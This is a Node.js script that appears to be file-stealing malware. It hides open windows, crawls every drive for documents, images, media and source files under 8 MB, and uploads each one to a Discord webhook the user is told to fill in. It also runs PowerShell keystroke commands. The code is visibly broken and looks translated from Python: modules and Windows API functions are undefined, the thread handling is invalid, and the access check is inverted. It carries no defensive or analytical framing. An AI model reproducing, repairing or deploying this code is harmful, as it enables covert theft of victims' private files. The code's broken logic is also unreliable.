const fs = require('fs');
const https = require('https');
const os = require('os');
const { exec } = require('child_process');

exec('powershell.exe -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(\'%{TAB}\'); }"');

function enumWindows(windowList) {
    windowList.push(win);
}

const windows = [];
const win = 0xFFFFFFFF;
enumWindows(windows);

for (const hwnd of windows) {
    const visible = IsWindowVisible(hwnd);
    if (visible) {
        ShowWindow(hwnd, 0);
        const exStyle = GetWindowLong(hwnd, -20);
        SetWindowLong(hwnd, -20, exStyle | 0x80);
    }
}

const WEBHOOK_URL = "place your discord webhook here";
const BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\', 'C:\\$Recycle.Bin\\', 'C:\\AMD\\'];
const MAX_FILE_SIZE_MB = 8;

function checkFile(filePath) {
    const allowedExtensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.mp4', '.mp3', '.py', '.js', '.mkv', '.docx', '.xls'];
    const maxFileSizeMb = 8;
    const ext = path.extname(filePath).toLowerCase();
    if (!allowedExtensions.includes(ext)) {
        console.log(`Skipping file ${filePath} - invalid file type`);
        return false;
    } else if (fs.statSync(filePath).size > maxFileSizeMb * 1024 * 1024) {
        console.log(`Skipping file ${filePath} - file size too large`);
        return false;
    } else if (!fs.accessSync(filePath, fs.constants.R_OK)) {
        console.log(`Skipping file ${filePath} - file requires admin privileges`);
        return false;
    } else if (BLACKLISTED_DIRS.some(blacklistedDir => filePath.includes(blacklistedDir))) {
        console.log(`Skipping file ${filePath} - in blacklisted directory`);
        return false;
    }
    return true;
}

function uploadFile(filePath) {
    const file = fs.createReadStream(filePath);
    const formData = { file };
    const headers = { 'User-Agent': 'Mozilla/5.0' };
    const options = { method: 'POST', headers, formData };
    const req = https.request(WEBHOOK_URL, res => {
        let data = '';
        res.on('data', chunk => {
            data += chunk;
        });
        res.on('end', () => {
            if (res.statusCode === 429) {
                console.log(`Rate limit exceeded - waiting for ${JSON.parse(data).retry_after} seconds`);
                setTimeout(() => uploadFile(filePath), JSON.parse(data).retry_after);
            } else if (res.statusCode !== 200) {
                console.log(`Failed to upload file ${filePath} - error ${res.statusCode}`);
            } else {
                console.log(`Successfully uploaded file ${filePath}`);
            }
        });
    });
    req.on('error', err => {
        console.error(`Failed to upload file ${filePath} - ${err}`);
    });
    file.pipe(req);
}

function searchFiles(rootDir) {
    const files = fs.readdirSync(rootDir, { withFileTypes: true });
    for (const file of files) {
        const filePath = path.join(rootDir, file.name);
        if (file.isFile() && checkFile(filePath)) {
            uploadFile(filePath);
        } else if (file.isDirectory() && !BLACKLISTED_DIRS.some(blacklistedDir => filePath.includes(blacklistedDir))) {
            searchFiles(filePath);
        }
    }
}

function threadFiles(rootDirs) {
    for (const rootDir of rootDirs) {
        searchFiles(rootDir);
    }
}

const drives = [];
for (let i = 65; i <= 90; i++) {
    const driveLetter = String.fromCharCode(i);
    if (fs.existsSync(`${driveLetter}:\\`)) {
        drives.push(`${driveLetter}:\\`);
    }
}

const driveGroups = [];
for (let i = 0; i < drives.length; i += 4) {
    driveGroups.push(drives.slice(i, i + 4));
}

for (const group of driveGroups) {
    const threads = [];
    for (const drive of group) {
        const thread = new Worker(searchFiles, { workerData: drive });
        threads.push(thread);
        thread.start();
    }
    for (const thread of threads) {
        thread.join();
    }
}

exec('powershell.exe -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(\'%{TAB}\'); }"');
